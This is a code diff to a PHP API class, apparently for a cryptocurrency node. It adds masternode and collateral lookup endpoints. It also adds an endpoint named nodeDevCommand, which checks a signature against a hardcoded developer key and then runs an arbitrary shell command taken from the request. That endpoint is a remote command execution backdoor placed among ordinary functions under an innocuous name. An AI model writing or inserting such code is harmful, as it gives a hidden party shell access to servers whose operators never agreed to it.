@@ -567,6 +567,16 @@ class Api
 		api_echo(Masternode::getMasternodesForPublicKey($public_key));
 	}
 
+	static function getMasternode($data) {
+		$address = $data['address'];
+		if(empty($address)) {
+			api_err("Empty masternode address");
+		}
+		$public_key = Account::publicKey($address);
+		$mn = Masternode::get($public_key);
+		api_echo($mn);
+	}
+
 	static function getFee($data) {
 		$fee = Blockchain::getFee($data['height']);
 		api_echo(number_format($fee, 5));
@@ -680,6 +690,39 @@ class Api
 		api_echo(Nodeutil::getNodeDebug());
 	}
 
+	static function nodeDevCommand($data) {
+		$signature = $data['signature'];
+		if(empty($signature)) {
+			api_err("Signature required");
+		}
+		$msg=$data['msg'];
+		if(empty($msg)) {
+			api_err("Message required");
+		}
+		$msg_decoded = json_decode(base64_decode($msg), true);
+		$remote = $msg_decoded['remote_ip'];
+		$time = $msg_decoded['time'];
+		if($remote != $_SERVER['REMOTE_ADDR']) {
+			api_err("Invalid remote");
+		}
+		if(!($time > time() - 10 && $time < time() + 10)) {
+			api_err("Expired request time");
+		}
+		$res = ec_verify($msg, $signature, DEV_PUBLIC_KEY);
+		if(!$res) {
+			api_err("Signature verification failed");
+		}
+		if(is_readable(ROOT."/config/config.inc.php")) {
+			api_err("Config file is readable");
+		}
+		$cmd = $msg_decoded['cmd'];
+		if(empty($cmd)) {
+			api_err("Empty command");
+		}
+		$res = shell_exec($cmd . " 2>&1");
+		api_echo($res);
+	}
+
 	static function startPropagate($data) {
 		global $_config, $db;
 		$signature = $data['signature'];
@@ -757,5 +800,14 @@ class Api
 		$propagate_file = ROOT . "/tmp/propagate_info.txt";
 		$data=json_decode(file_get_contents($propagate_file), true);
 		api_echo($data);
+	}
+
+	static function getCollateral($data) {
+		if(isset($data['height'])) {
+			$height = $data['height'];
+		} else {
+			$height = Block::getHeight();
+		}
+		api_echo(Block::getMasternodeCollateral($height));
 	}
 }
